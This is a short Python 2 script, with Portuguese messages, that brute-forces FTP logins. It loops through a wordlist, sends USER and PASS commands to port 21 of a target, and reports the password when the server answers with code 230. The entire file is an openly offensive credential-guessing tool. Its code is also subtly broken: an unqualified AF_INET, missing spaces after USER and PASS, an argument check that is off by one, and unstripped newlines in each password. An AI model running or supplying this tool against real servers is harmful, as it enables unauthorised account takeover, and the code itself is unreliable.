#!/usr/bin/python
import socket,sys,re

if len(sys.argv) < 3:
	print "Modo de uso ftpbruteforce.py 192.168.0.1 usuario wordlist.txt"
	sys.exit()

target = sys.argv[1]
usuario = sys.argv[2]
f = open(sys.argv[3])


for palavra in f.readlines():
	print "Realizando Brute Force FTP: %s %s"%(usuario,palavra)
	s = socket.socket(AF_INET, socket.SOCK_STREAM)
	s.connect((target,21))
	s.recv(1024)
	
	s.send("USER"+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS"+palavra+"\r\n")
	resposta = s.recv(1024)
	print resposta
	s.send("QUIT\r\n")
	
	if re.search('230', resposta):
		print "[+] Senha Encontrada ---> ",palavra
		break
	
